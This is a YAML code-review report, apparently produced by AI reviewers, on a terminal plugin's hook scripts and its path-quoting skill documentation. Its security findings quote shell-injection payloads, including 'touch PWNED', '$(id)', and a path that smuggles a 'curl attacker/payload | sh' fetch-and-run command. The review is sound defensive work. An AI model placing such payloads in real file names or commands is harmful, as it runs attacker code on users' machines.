@@ -1,0 +1,248 @@
+round: 2
+executed_at: "2026-07-25T12:20:00+09:00"
+scope:
+  review_mode: diff
+  base_commit: a0db9ea641ae236fc68e87bb4487c5ec219a114a
+  head_commit: 132ab54efcd1ca0de165bfe287d649f5af9b76bd
+  changed_files:
+    - plugins/emterm/README.md
+    - plugins/emterm/hooks/hooks.json
+    - plugins/emterm/hooks/scripts/notify-status.sh
+    - plugins/emterm/hooks/scripts/notify-status.test.ts
+    - plugins/emterm/hooks/scripts/notify-status.ts   # deleted
+    - plugins/emterm/skills/display-image/SKILL.md
+    - plugins/emterm/skills/display-json/SKILL.md
+    - plugins/emterm/skills/display-markdown/SKILL.md
+    - plugins/emterm/skills/display-yaml/SKILL.md
+    - plugins/emterm/skills/skills.test.ts
+plan:
+  floor: [comprehensive, security, performance, spec]
+  discretionary: []
+  codex_cross_validation: true
+perspective_runs:
+  - {perspective: comprehensive, source: claude, status: completed}
+  - {perspective: security, source: claude, status: completed}
+  - {perspective: security, source: codex, status: completed}
+  - {perspective: performance, source: claude, status: completed}
+  - {perspective: performance, source: codex, status: completed}
+  - {perspective: spec, source: claude, status: completed}
+  - {perspective: spec, source: codex, status: completed}
+verified_fixed:
+  # Round-1 findings re-checked and confirmed fixed by round-2 reviewers.
+  - cm-no-blocked-recovery       # PostToolUse->working; comprehensive verified the terminalSequence is applied on command-hook stdout
+  - cm-stopfailure-unwired       # StopFailure->idle wired
+  - cm-wire-drift-undetected     # expectation now derived from agent_status.rs constants; perturbation test confirmed red
+  - sc-display-hardening-wrong-path  # Bash-first form is reachable and the quoting rule is sufficient for arbitrary paths
+findings:
+  - stable_id: sp-fr7-contradicts-impl
+    severity: high
+    category: spec
+    file: plugins/emterm/skills/display-markdown/SKILL.md
+    line: 27
+    title: "FR7 mandates no-shell argv invocation; all four display skills now do the opposite"
+    description: >
+      SPEC FR7 still reads "MUST document that the file path is passed as a single argv element
+      through a no-shell invocation, and MUST NOT instruct the model to interpolate the path into
+      a shell command string". The round-1 fix did precisely the opposite — it made the
+      Bash-first `emterm <sub> [opts] -- '<path>'` form the primary MUST and demoted argv-array
+      to an optional alternative — because a Claude Code skill can only reach emterm through the
+      Bash tool. SPEC's Security Considerations ("extends the argv-based invocation requirement
+      from mux-send ... closing the last documented shell-string-interpolation path") and TS-10
+      carry the same stale wording, and skills.test.ts now pins the Bash-first form, so FR7 is
+      permanently unmet as written. FR4 and the Wire-format duplication paragraph were amended
+      this round; FR7 was not. Detected independently by spec/claude and spec/codex.
+    suggestion: >
+      Amend FR7 (not the implementation): require the single-quoted path after `--` as the
+      primary form, require the `'\''` escaping rule, forbid a bare unquoted path, and allow an
+      argv-array invocation as an equally safe alternative where one exists. Update the Security
+      Considerations bullet and TS-10 to match, and drop the "mirrors mux-send" claim unless
+      mux-send is also reworked (see sc-mux-send-unreachable).
+    sources: [claude:spec, codex:spec]
+    confidence: 95
+    resolution: unresolved
+  - stable_id: cm-tilde-expansion-broken
+    severity: medium
+    category: comprehensive
+    file: plugins/emterm/skills/display-markdown/SKILL.md
+    line: 27
+    title: "Mandatory single-quoting breaks ~ expansion; ~/path always fails"
+    description: >
+      All four display skills now require the path to be single-quoted. Tilde expansion does not
+      happen inside single quotes, so `emterm markdown -- '~/notes.md'` passes the literal string
+      `~/notes.md` to clap, which has no expansion logic. Verified empirically during review:
+      `emterm markdown ~/tilde-poc.md` exits 0 while `emterm markdown -- '~/tilde-poc.md'` exits
+      2 (file not found). The pre-change bare form let the shell expand `~`, so this is a
+      functional regression introduced by the security hardening, with no note in any of the four
+      files to explain the failure.
+    suggestion: >
+      Add a bullet to the Argument-injection safety section of all four display skills covering
+      tilde paths: resolve `~` to an absolute path before quoting, or expand only the `~` segment
+      and quote the rest, e.g. `emterm markdown -- "$HOME"'/notes.md'`. Add a regression
+      assertion in skills.test.ts.
+    sources: [claude:comprehensive]
+    confidence: 65
+    resolution: unresolved
+  - stable_id: cm-readme-hook-drift
+    severity: medium
+    category: comprehensive
+    file: plugins/emterm/README.md
+    line: 23
+    title: "README still says 'Three hooks'; hooks.json now wires five plus a Notification matcher"
+    description: >
+      hooks.json grew from three to five entries (PostToolUse->working, StopFailure->idle) and
+      the Notification entry gained an anchored matcher, but README's "What gets wired" still
+      describes three hooks with an unrestricted Notification. A reader concludes that every
+      notification flips the badge to blocked and that API-error turn endings report nothing.
+      FR8 enumerates the README edits for this feature and does not mention this line, and the
+      skills.test.ts README assertions do not cover it, so nothing catches the drift. README was
+      task0002's scope while the hook change was task0003's — the gap fell between the two tasks.
+      Detected independently by comprehensive/claude and spec/claude.
+    suggestion: >
+      Update the line to name all five hooks and state that Notification is restricted to
+      permission_prompt / elicitation_dialog / agent_needs_input. Add a skills.test.ts assertion
+      tying the README text to the hooks.json event-key set so it cannot drift again.
+    sources: [claude:comprehensive, claude:spec]
+    confidence: 80
+    resolution: unresolved
+  - stable_id: sc-doublequote-not-taught
+    severity: medium
+    category: security
+    file: plugins/emterm/skills/display-markdown/SKILL.md
+    line: 27
+    title: "Adversarial examples only use a ';' payload, which double quotes also defeat"
+    description: >
+      Each display skill's sole adversarial example is `report.md; touch PWNED`. That payload is
+      neutralised by double quotes just as well as by single quotes, so the example does not
+      discriminate between the required form and the common near-miss. The unsafe side shows only
+      a bare unquoted path. The axis the model learns is therefore "quote it", not "single-quote
+      it" — and `$(...)`, backticks, and `${...}` DO expand inside double quotes. The threat model
+      already includes this payload class: notify-status.test.ts uses `$(id)` as an injection
+      case. skills.test.ts's assertion only looks for the `touch PWNED` example, so the gap is
+      not covered by tests either.
+    suggestion: >
+      In all four display skills, state explicitly that double quotes are insufficient because
+      `$(...)`, backticks, and `${...}` still expand inside them, and add a second adversarial
+      example using a command-substitution payload contrasting the single-quoted safe form with
+      the double-quoted unsafe form. Extend the skills.test.ts assertion to require both the
+      double-quote warning and a `$(`-or-backtick example.
+    sources: [claude:security]
+    confidence: 60
+    resolution: unresolved
+  - stable_id: sc-mux-send-unreachable
+    severity: medium
+    category: security
+    file: plugins/emterm/skills/mux-send/SKILL.md
+    line: 24
+    title: "mux-send still carries the unreachable argv-array primary MUST that was withdrawn elsewhere"
+    description: >
+      Round 1 established that "assemble the invocation as an argv array" names an execution path
+      a Claude Code skill cannot reach, and the four display skills were rewritten accordingly.
+      mux-send — the file those skills were told to mirror — was outside that task's scope and
+      still makes the same unreachable instruction its primary MUST. mux-send is the higher-value
+      target of the five (it types into a live PTY, so injection there is command execution in
+      the destination pane). Its recommended safe form
+      `printf '%s' "$TEXT" | emterm mux send --pane <id> --stdin` is also circular for a Bash-only
+      caller: assigning untrusted text into `$TEXT` is itself the step that needs escaping.
+    suggestion: >
+      Apply the same Bash-first rework to mux-send. A quoted-delimiter heredoc avoids the
+      variable-assignment problem entirely for --stdin, and the --text path should follow the
+      display skills' single-quote plus `'\''` rule. Extend the skills.test.ts hardening
+      assertions to cover mux-send.
+    sources: [claude:security]
+    confidence: 60
+    resolution: unresolved
+  - stable_id: cm-display-image-self-contradiction
+    severity: medium
+    category: comprehensive
+    file: plugins/emterm/skills/display-image/SKILL.md
+    line: 11
+    title: "display-image canonical example includes --protocol kitty while the body says to omit it"
+    description: >
+      The copy-pastable canonical example is `emterm image --protocol kitty -- '<path>'`, but the
+      body a few lines later says `--protocol` is optional, kitty is the default, and it should be
+      omitted unless the user asks for a protocol. A SKILL.md is a prompt artifact and the first
+      code block is the strongest behavioural cue, so the model will tend to always pass
+      `--protocol kitty`. skills.test.ts pins the contradiction by asserting the canonical prefix
+      is `emterm image --protocol kitty`, so fixing only the prose breaks the test.
+    suggestion: >
+      Either revert the canonical example to `emterm image -- '<path>'` and show
+      `emterm image --protocol sixel -- '<path>'` as a second, protocol-specified example
+      (updating the test's expected prefix), or drop the "omit it" sentence and reword it as
+      "replace kitty with sixel when the user asks for it".
+    sources: [claude:comprehensive]
+    confidence: 65
+    resolution: unresolved
+  - stable_id: sp-fr6-delete-vs-replace
+    severity: medium
+    category: spec
+    file: plugins/emterm/hooks/scripts/notify-status.test.ts
+    line: 1
+    title: "FR6 says notify-status.test.ts MUST be deleted; SPEC's own file-structure section says replaced in place"
+    description: >
+      FR6 states that both notify-status.ts and notify-status.test.ts "MUST be deleted", with
+      coverage replaced by tests over the shell script. The File structure section of the same
+      SPEC annotates the test file as "replaced in place". The implementation did the sensible
+      thing (rewrote it in place), so the defect is the self-contradicting requirement, not the
+      code.
+    suggestion: >
+      Amend FR6 to require deleting notify-status.ts and REPLACING the content of
+      notify-status.test.ts, matching the File structure section and the implementation.
+    sources: [codex:spec]
+    confidence: 50
+    resolution: unresolved
+  - stable_id: cm-minversion-args-stopfailure
+    severity: medium
+    category: comprehensive
+    file: plugins/emterm/README.md
+    line: 17
+    title: "Stated minimum 2.1.141 is derived from terminalSequence alone, not from args exec form or StopFailure"
+    description: >
+      README and SPEC justify the v2.1.141 floor solely by the terminalSequence field, but this
+      round added two further dependencies: the `args` exec form and the StopFailure event. On a
+      version that ignores an unknown `args` field, `command` would run through a shell with zero
+      arguments, the script's `[ "$#" -ne 1 ]` guard would exit 0, and the whole feature would go
+      silently dead — the exact failure mode this feature exists to eliminate.
+      Orchestrator check: neither `args` nor `StopFailure` carries a min-version marker in the
+      hooks documentation (13 such markers exist elsewhere in that page), so there is no evidence
+      of a version window where terminalSequence works but `args` does not. Recorded as a
+      documentation-precision issue rather than a demonstrated defect.
+    suggestion: >
+      Either confirm the introducing versions and raise the stated floor to the newest of the
+      three, or note in the README that the floor covers terminalSequence and that the exec form
+      and StopFailure are assumed available at that version.
+    sources: [claude:comprehensive]
+    confidence: 50
+    resolution: unresolved
+  - stable_id: sc-prose-escaping-fallible
+    severity: medium
+    category: security
+    file: plugins/emterm/skills/display-markdown/SKILL.md
+    line: 21
+    title: "Injection prevention rests on model-applied prose escaping rather than an enforced boundary"
+    description: >
+      The skills accept paths from untrusted tool or file output and ask the model to serialise
+      them into a Bash command, replacing each single quote with `'\''`. The rule is correct for
+      every POSIX metacharacter and `--` blocks option injection, but it is prose, not an enforced
+      serialization boundary: one omitted or malformed escape on a path such as
+      `x'; curl attacker/payload | sh; #.md` executes attacker-controlled commands.
+      CONFLICT: this prescribes the opposite direction to sc-display-hardening-wrong-path
+      (round 1), which found that the argv-array path Codex recommends is not reachable from a
+      Claude Code skill — the only execution surface is the Bash tool. Codex's residual-risk
+      analysis is sound; its remedy is not currently implementable.
+    suggestion: >
+      Codex's remedy (mandate a structured argv-array execution path) is not actionable while the
+      Bash tool is the only surface. Record the residual risk explicitly in SPEC's Security
+      Considerations and the README known limitations instead, so the prose-escaping dependency is
+      disclosed rather than implied.
+    sources: [codex:security]
+    confidence: 50
+    resolution: unresolved
+auto_fix:
+  loops_run: 0
+  applied_total: 0
+  termination: no-candidates
+  note: >
+    No auto-fix candidates: the single high finding is category spec (excluded by the auto-fix
+    gate) and every medium is below the severity threshold.
+residual_critical_high: 1
+rework_required: true
